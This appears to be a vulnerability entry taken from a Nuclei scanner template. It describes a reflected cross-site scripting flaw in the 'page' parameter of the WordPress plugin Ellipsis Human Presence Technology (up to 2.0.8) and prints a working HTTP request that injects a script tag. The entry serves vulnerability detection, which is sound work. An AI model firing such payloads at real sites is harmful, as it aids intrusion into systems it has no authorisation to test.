# Vulnerability: Ellipsis Human Presence Technology <= 2.0.8 - Cross Site Scripting
**Classification:** WPSCAN
**Source:** Nuclei Template (`wp-ellipsis-xss.yaml`)

## Description
The 'page' GET parameter of the inc/protected-forms-table.php file was affected by a reflected XSS vulnerability.

## Vulnerable Code Pattern / Exploit Payload
```http
GET /wp-content/plugins/ellipsis-human-presence-technology/inc/protected-forms-table.php?&page=%22%20%3E%3Cscript%3Ealert(document.location)%3C/script%3E HTTP/1.1
Host: {{Hostname}}
```

